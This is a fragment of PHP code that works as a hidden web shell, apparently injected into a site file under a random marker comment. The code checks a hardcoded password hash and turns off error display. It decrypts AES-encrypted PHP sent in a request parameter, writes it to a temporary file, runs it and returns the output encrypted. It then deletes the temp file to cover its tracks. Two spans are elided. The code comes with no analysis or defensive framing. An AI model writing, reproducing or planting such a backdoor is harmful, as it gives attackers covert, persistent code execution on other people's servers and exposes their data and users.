...
/*7_2of4xwkrtq4l0yx0p2_tont_*/
if( isset( $_REQUEST['pfkbtb'] ) ) {
    @ini_set('error_reporting', 0);
    @ini_set('display_errors', 0);
    @ini_set('display_startup_errors', 0);
    function code_ex() {
        define('BORDERS', 'ojae4un7drfriie7b');
        function _out( $data, $name_tempfile = '', $key = 'Zxm8Emp93DvjQV7aRLal9arPH91DZ6Tf7d5X6mHqryk=' ) {
            $data = @openssl_encrypt($data, "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));
            if($name_tempfile != '')
                @unlink($name_tempfile);
            return BORDERS . $data . BORDERS;
        }
        function sd($filename) {
            if(file_exists($filename))
                unlink($filename);
        }
        if (md5(base64_decode($_REQUEST['pfkbtb'])) !== '0e85c9a7da660241bb4c5d4cef858b97')
            exit(_out("BAD_PAS"));
        $key = 'Zxm8Emp93DvjQV7aRLal9arPH91DZ6Tf7d5X6mHqryk=';

        if (!isset($_REQUEST['nfu']))
            exit(_out("EMPTY_CODE"));

        if($tempfile = tmpfile())
        {
            $meta_tempfile = stream_get_meta_data($tempfile);
            $name_tempfile = $meta_tempfile['uri'];
        }
        if(!is_writable($name_tempfile)) {
            $temp_paths = array_unique(array('/tmp', ini_get('upload_tmp_dir'), sys_get_temp_dir(), dirname(__FILE__)));
            foreach ($temp_paths as $path) {
                $name_tempfile = tempnam($path, '');
                if (is_writable($name_tempfile))
                    break;
            }
            if(!is_writable($name_tempfile))
                exit(_out("FILE_NOT_CREATE"));
        }

        register_shutdown_function('sd', $name_tempfile);
        $code = @openssl_decrypt($_REQUEST['nfu'], "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));

        if (!preg_match('#^<\?php#', $code)) {
            exit(_out("BAD_CODE", $name_tempfile));
        }

        file_put_contents($name_tempfile, $code, LOCK_EX);
        ...
        ob_start();
            include_once $name_tempfile;
        $output = ob_get_contents();
        ob_clean();

        echo _out( $output, $name_tempfile );
        exit;
    }
    code_ex();
}
